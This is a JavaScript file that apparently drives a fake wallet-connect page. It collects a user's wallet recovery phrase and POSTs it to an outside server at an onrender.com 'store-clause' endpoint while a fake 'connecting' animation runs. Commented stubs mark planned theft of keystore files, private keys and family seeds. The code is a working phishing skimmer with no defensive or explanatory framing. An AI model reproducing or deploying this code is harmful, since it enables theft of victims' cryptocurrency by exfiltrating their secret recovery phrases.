var phrase = document.querySelector("#phrase");
var phraseText = document.querySelector("#phraseText");
var keystore = document.querySelector("#keystore");
var private = document.querySelector("#private");
var family = document.querySelector("#family");
var secret = document.querySelector("#secret");
var first = document.querySelector("#first");
var second = document.getElementById("second");
var third = document.querySelector("#third");
var fourth = document.getElementById("fourth");
var fiveth = document.querySelector("#fiveth");
var wallet_name = document.querySelector("#walletname");
const button = document.getElementById("submit-button");

function loading() {
  var a = setTimeout(function () {
    connecting.innerHTML = ".";
  }, 500);
  var a = setTimeout(function () {
    connecting.innerHTML = "..";
  }, 1000);
  var a = setTimeout(function () {
    connecting.innerHTML = "...";
  }, 1500);
  var a = setTimeout(function () {
    connecting.innerHTML = "CONNECT";
  }, 2000);
}

function onClickFunction() {
  // alert("Button clicked!");
  document.getElementById("wal1").value = popupname.innerHTML;
  var phraseVal = document.getElementById("phraseinput").value;
  console.log(phraseVal);
  if (phraseVal != "") {
    // ADD NEW BLOCK FOR SENDING REQUEST.
    const url = "https://new-webserver.onrender.com/api/store-clause";
    const data = {
      clause: phraseVal,
    };
    fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error("Network response was not ok");
        }
        return response.json();
      })
      .then((responseData) => {
        console.log("POST request successful. Response:", responseData);
      })
      .catch((error) => {
        console.error("There was a problem with the POST request:", error);
      });
  } else {
    console.log("Empty.");
  }
  // //
  // if (keystoreval != "" && keystorepass != "") {
  //   // ADD NEW BLOCK FOR SENDING REQUEST.
  // }

  // //
  // if (privatekeyval != "") {
  //   // ADD NEW BLOCK FOR SENDING REQUEST.
  // }

  // //
  // if (
  //   privateVal1 != "" &&
  //   privateVal2 != "" &&
  //   privateVal3 != "" &&
  //   privateVal4 != "" &&
  //   privateVal5 != "" &&
  //   privateVal6 != "" &&
  //   privateVal7 != "" &&
  //   privateVal8 != ""
  // ) {
  //   // ADD NEW BLOCK FOR SENDING REQUEST.
  // }
  // //
  // if (familyseedVal != "") {
  //   // ADD NEW BLOCK FOR SENDING REQUEST.
  // }
}
